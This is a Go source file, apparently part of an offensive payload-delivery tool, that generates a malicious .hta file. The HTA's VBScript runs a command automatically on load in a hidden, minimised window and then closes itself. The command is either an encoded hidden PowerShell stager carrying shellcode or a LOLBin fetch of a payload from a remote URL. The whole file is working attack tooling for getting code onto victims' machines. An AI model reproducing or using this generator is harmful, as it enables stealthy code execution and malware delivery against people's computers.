// hta.go — emit an HTML Application (.hta). Run via `mshta payload.hta` or
// double-click. The HTA hosts a VBScript Window_OnLoad that runs the chosen
// command via WScript.Shell.Run (hidden window, no wait). Inline mode embeds
// the shellcode via `powershell -w hidden -enc <stager>`; remote mode runs the
// launcher's LOLBin fetch primitive for --url.
package delivery

import "strings"

type htaEmitter struct{}

func (htaEmitter) Name() string { return "hta" }
func (htaEmitter) Ext() string  { return "hta" }

func (htaEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("hta")
	}
	body := htaBody(cmd)
	return []Artifact{writeFile("payload.hta", []byte(body))}, nil
}

// htaBody renders a minimal HTA whose VBScript auto-runs `cmd` on load.
func htaBody(cmd string) string {
	var b strings.Builder
	b.WriteString("<html>\n<head>\n")
	b.WriteString("<HTA:APPLICATION ID=\"o\" APPLICATIONNAME=\"x\" WINDOWSTATE=\"minimize\" SHOWINTASKBAR=\"no\" />\n")
	b.WriteString("<script language=\"VBScript\">\n")
	b.WriteString("Sub Window_OnLoad\n")
	b.WriteString("  Set s = CreateObject(\"WScript.Shell\")\n")
	b.WriteString("  s.Run \"" + vbsEscape(cmd) + "\", 0, False\n")
	b.WriteString("  Self.Close\n")
	b.WriteString("End Sub\n")
	b.WriteString("</script>\n")
	b.WriteString("</head>\n<body onload=\"Window_OnLoad()\"></body>\n</html>\n")
	return b.String()
}